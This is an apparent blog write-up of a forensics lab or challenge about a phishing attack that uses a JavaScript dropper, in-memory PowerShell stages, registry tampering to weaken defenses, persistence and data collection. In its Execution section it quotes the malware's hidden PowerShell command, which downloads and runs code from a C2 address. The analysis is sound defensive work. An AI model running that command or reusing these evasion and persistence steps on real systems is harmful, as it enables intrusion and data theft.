---
title: "Revenge Hotels APT Investigation"
description: "Complete forensic analysis of a sophisticated multi-stage APT attack involving phishing, PowerShell payloads, and data exfiltration"
pubDatetime: 2025-09-29T00:00:00Z
tags: ["malware-analysis", "apt", "forensics", "incident-response"]
draft: false
---

# Scenario

On September 28, 2025, the SOC team detected suspicious network activity from an administrator's workstation, including connections to an unknown external IP address and unauthorized security tool modifications. The user reported opening what appeared to be a legitimate document received via email earlier that day, after which their security software was mysteriously disabled.

Initial triage reveals evidence of file creation in unusual locations and system configuration changes, suggesting a multi-stage attack with potential data exfiltration occurring hours after the initial compromise.

You have been provided with a disk triage of the compromised host. Your mission is to reconstruct the complete attack chain, identify all malicious components, and determine the full scope of the compromise.

# Key takeaways

* The Intrution began with the Phising Mail linked to the malicous Javascript which is actually legitimate document.
*  The JavaScript payload downloaded a multi-stage PowerShell script that retrieved and executed additional files, ultimately deploying swchost.exe.
* The malware employed defense evasion techniques (MITRE T1562.001), including modifying 12 security-related registry keys to weaken system defenses.
* Persistence was established via both registry RunOnce entries and an additional VBS script dropped to maintain execution across reboots.
* The malware communicated with a remote C2 server and deployed a secondary data-collection executable (Flfs6heTV2lb.exe).
* Exfiltrated data was archived and prepared for transmission at 2025-09-28 17:16, posing a high confidentiality risk to the affected system.

# Case Summary
The investigation determined that the compromise originated from a phishing email containing a URL used to download the payload. When accessed, a malicious JavaScript file was delivered to the victim’s device, hosted on the domain hotelx.rf.gd.
Upon execution, the script performed two actions: first, it disabled RealTimeMonitoring on the operating system, and second, it created a PowerShell (PS1) file whose purpose was to download additional components and execute them in memory.
Eventually, the downloaded malware was decoded into a PE format executable, which modified several registry locations with the intent of weakening system defenses. It also employed multiple persistence mechanisms, including a RunOnce registry entry and a VBS-based launcher.
Network analysis confirmed outbound communication to a C2 server at 3.122.239.15, followed by the deployment of a secondary data-collection executable. This incident demonstrates a deliberate, modular attack chain crafted to bypass defenses, maintain long-term persistence, and facilitate data theft.

# Analysts
## Initial Access



After downloading the JavaScript file named `invoice82962.js` from the suspicious link, the script creates two PowerShell commands. One of these commands decodes a Base64 payload that is used to download and execute the next stage in memory without writing it to disk, using the IEX-DownloadString technique. This behavior is difficult to detect because it closely mimics legitimate PowerShell usage. Additionally, the payload was hosted on the domain `hotelx.rf.gd`.


![1.png](https://raw.githubusercontent.com/KajriVN/Blog/main/src/assets/images/revengehotels/1.png)
![2.png](https://raw.githubusercontent.com/KajriVN/Blog/main/src/assets/images/revengehotels/2.png)


## Execution




Firstly, the legitimate JS created 2 Powershell in :

    var directoryPath = "C:\\Users\\Public\\Scripts";
Next, that code also dowloaded 2 files (runpe.txt and venumentrada.txt) but it did not show on logs because of `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ' + IEX (New-Object Net.WebClient).DownloadString('http://3.122.239.15:8000/cargajecerrr.txt')`, which would run on RAM at the real time, so there are no logs on system.

Additionally, you have to handle the `venumentrada.txt` and get the PowerShell loader script that decoded the `runpe.txt`, renamed `swchost.exe` and execute immediately.

![3.png](https://raw.githubusercontent.com/KajriVN/Blog/main/src/assets/images/revengehotels/3.png)

## Defense Evasion

Overall, the Javascript that threat actor write is actually the ATT&CK `T1562.001` technique because Adversaries  modified and disabled security tools to avoid possible detection of their malware/tools and activities. This might take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools did not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.

On top of that, when I checking the logs in Sysmon, I realized that the payloads trying to modify the Registy, which can make the protector weak. So, there are `12 registy ` changed with EventID 13 after figuring out.

![4.png](https://raw.githubusercontent.com/KajriVN/Blog/main/src/assets/images/revengehotels/4.png)


## Command and Control (C2)

After decoding the Base64 string, identifying the C2 becomes mush esier. I got the IP address, port number, and what the payload is. This allows analysts to quickly determine where the malware is connecting, confirm malicious network behavior, and map it to the corresponding C2 infrastructure.

![5.png](https://raw.githubusercontent.com/KajriVN/Blog/main/src/assets/images/revengehotels/5.png)

## Persistence 

Following the Sysmon logs, I realized that the malware copy itself to another location.

![6.png](https://raw.githubusercontent.com/KajriVN/Blog/main/src/assets/images/revengehotels/6.png)

Addtionally,to maintain persistence after system reboots, the executable added an entry to a specific registry location. The full path of the registry key where the executable added its persistence mechanism

![7.png](https://raw.githubusercontent.com/KajriVN/Blog/main/src/assets/images/revengehotels/7.png)



Next, Malware create another vbs file which is executed by the malicious executable for persistence

![9.png](https://raw.githubusercontent.com/KajriVN/Blog/main/src/assets/images/revengehotels/9.png)
Last but not least, this malware used a specific Windows API function to mark itself as critical to ensure the malware process couldn't be terminated easily.

![10.png](https://raw.githubusercontent.com/KajriVN/Blog/main/src/assets/images/revengehotels/10.png)

## Collection

After read all event id 11 in logs, It is mistake if you stop reading at 1:40PM because this malware will drop an exe file to collect user data. But the importance is it spent a lot of times sleeping, just waked up at 17:16:52. This technique to avoid VM or sandbox detecting.

![11.png](https://raw.githubusercontent.com/KajriVN/Blog/main/src/assets/images/revengehotels/11.png)

